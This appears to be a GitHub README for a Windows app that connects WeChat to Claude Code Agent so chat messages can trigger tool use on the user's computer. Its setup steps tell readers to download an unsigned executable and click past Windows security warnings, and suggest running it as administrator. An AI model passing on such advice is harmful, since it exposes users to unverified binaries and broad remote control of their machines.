# 🤖 cc-weixin - Run Claude Code in WeChat

[![Download cc-weixin](https://img.shields.io/badge/Download%20cc--weixin-blue?style=for-the-badge)](https://github.com/Armchaircounty801/cc-weixin/releases)

## 📥 Download cc-weixin

Go to the [Releases page](https://github.com/Armchaircounty801/cc-weixin/releases) and download the Windows build.

If there are several files, choose the one for Windows. It is usually a `.exe` file or a `.zip` file. If you download a `.zip` file, unzip it first, then open the app.

## 🧭 What cc-weixin does

cc-weixin lets you use Claude Code Agent inside WeChat.

It works like this:

1. You send a message in WeChat
2. cc-weixin receives the message
3. Claude Code Agent reads it and can use tools
4. The reply goes back to WeChat

This makes it easier to ask Claude for help without leaving WeChat.

## 🪟 Windows setup

### 1. Download the app

Open the [Releases page](https://github.com/Armchaircounty801/cc-weixin/releases) in your browser.

Download the latest Windows file.

### 2. Extract the files

If the file is a `.zip`, do this:

1. Right-click the file
2. Select Extract All
3. Choose a folder you can find later, such as `Downloads\cc-weixin`

If the file is a `.exe`, you can keep it in the folder where you downloaded it.

### 3. Open the app

Double-click the app file to run it.

If Windows shows a security prompt:

1. Click More info
2. Click Run anyway

This is normal for many new apps that are not signed with a large software certificate.

### 4. Keep the app running

cc-weixin must stay open to keep working with WeChat.

Leave the window open while you use it.

## 🔧 What you need first

Before you run cc-weixin, make sure you have these things ready:

- A Windows computer
- A WeChat account
- Access to the Claude Code Agent service
- Internet access
- A folder where the app can save its files

For best results, use Windows 10 or Windows 11.

## 🧩 Basic setup steps

After you open the app, you will usually need to set a few values:

- WeChat login info or link method
- Your Claude Code Agent settings
- Your bot API access details
- Any local file path used by the app

If the app has a settings file, open it with Notepad and fill in the fields.

If the app has a setup screen, enter the values there.

## 💬 How to use it

Once the app is running:

1. Open WeChat
2. Send a message to the account or bot connected to cc-weixin
3. Wait for Claude Code Agent to reply
4. Read the answer in WeChat

You can ask for help with:

- System info
- File checks
- Short scripts
- Search tasks
- Text edits
- Basic troubleshooting

## 🖥️ Example use

You can send a message like:

- Tell me what computer I am using
- Check my battery level
- Read this file
- Help me write a small script
- Search the web for this topic

cc-weixin sends the message to Claude Code Agent, and the reply comes back to WeChat.

## 📁 Files in the project

This repository includes:

- The cc-weixin app code
- A demo image
- A document about the WeChat bot API
- Release files for Windows users

The app is small and focused on one task: connecting WeChat and Claude Code Agent.

## ⚙️ How it works

cc-weixin uses the iLink Bot API from Tencent.

In simple terms:

- WeChat sends the message
- The app reads it through the official bot API
- The app passes it to Claude Code Agent
- Claude uses its tools if needed
- The app sends the answer back to WeChat

This setup avoids manual copy and paste.

## 🛠️ Common setup issues

### The app does not open

Try these steps:

1. Make sure you downloaded the full file
2. Unzip the file if needed
3. Run it from a normal folder, not inside the zip
4. Try right-clicking and using Run as administrator

### Windows blocks the file

If Windows shows a warning:

1. Click More info
2. Click Run anyway

### WeChat does not reply

Check these items:

- The app is still running
- Your bot settings are correct
- Your network is working
- The WeChat account is linked in the app
- The Claude Code Agent service is available

### Messages arrive but do not answer well

Try shorter messages.

You can also test with simple prompts like:

- What is 2 + 2?
- List the files in this folder
- Show my system info

## 📌 Project state

This project is still early stage.

Some setup parts may change, and more options may be added later.

The current goal is to give Windows users a working path from download to first use.

## 🔗 More details

For a deeper look at the bot API and how the connection works, read:

[weixin-bot-api.md](./weixin-bot-api.md)

## 📷 Demo

![demo](./demo.png)

## 📄 License

Use this project according to the terms in the repository and related service terms for WeChat and Claude Code Agent